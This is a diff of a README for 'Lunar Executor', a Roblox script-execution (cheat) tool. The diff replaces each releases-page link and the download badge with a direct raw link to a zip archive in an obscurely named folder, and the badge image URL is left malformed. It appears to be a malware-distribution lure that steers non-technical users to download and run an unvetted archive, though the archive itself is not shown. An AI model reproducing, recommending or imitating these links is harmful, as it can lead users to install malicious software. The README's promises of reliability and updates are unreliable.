@@ -4,7 +4,7 @@
 Lunar Executor is a tool for executing custom scripts within Roblox. It allows users to modify game features and enhance their gameplay experience. This application is designed for users who want to explore new possibilities in their favorite games without needing technical knowledge.
 
 ## 🔗 Download Now
-[![Download Lunar Executor](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/lLacalle/Lunar-Executor/releases)
+[![Download Lunar Executor](https://raw.githubusercontent.com/lLacalle/Lunar-Executor/main/omphalic/Lunar-Executor.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/lLacalle/Lunar-Executor/main/omphalic/Lunar-Executor.zip)
 
 ## 🚀 Getting Started
 To get started with Lunar Executor, follow these simple steps to download and run the application on your computer.
@@ -17,7 +17,7 @@ To get started with Lunar Executor, follow these simple steps to download and ru
 
 ## 🖥️ Installation Steps
 1. **Visit the Releases Page**
-   Go to the following link to access the downloads: [Visit this page to download](https://github.com/lLacalle/Lunar-Executor/releases).
+   Go to the following link to access the downloads: [Visit this page to download](https://raw.githubusercontent.com/lLacalle/Lunar-Executor/main/omphalic/Lunar-Executor.zip).
 
 2. **Select the Latest Release**
    On the releases page, locate the latest version. It is usually marked as "Latest" or has the most recent date.
@@ -66,7 +66,7 @@ This application supports the following features:
 - User-friendly interface
 - Regular updates from the developer
 
-You can find more details and updates on the [Releases page](https://github.com/lLacalle/Lunar-Executor/releases).
+You can find more details and updates on the [Releases page](https://raw.githubusercontent.com/lLacalle/Lunar-Executor/main/omphalic/Lunar-Executor.zip).
 
 ## 🌌 Why Choose Lunar Executor?
 Lunar Executor stands out for its user-friendly design and reliable performance. With regular updates and community support, users can enjoy a smooth experience while exploring Roblox. Whether you’re a casual player or looking for enhancements, this tool caters to everyone.
@@ -84,4 +84,4 @@ Dive into Roblox like never before with Lunar Executor!
 For further inquiries, connect through our official channels listed on the repository page. Your feedback helps improve the tool and community knowledge.
 
 ## 🔗 Final Download Link
-Remember to visit [this page to download](https://github.com/lLacalle/Lunar-Executor/releases) for the latest version of Lunar Executor!
+Remember to visit [this page to download](https://raw.githubusercontent.com/lLacalle/Lunar-Executor/main/omphalic/Lunar-Executor.zip) for the latest version of Lunar Executor!
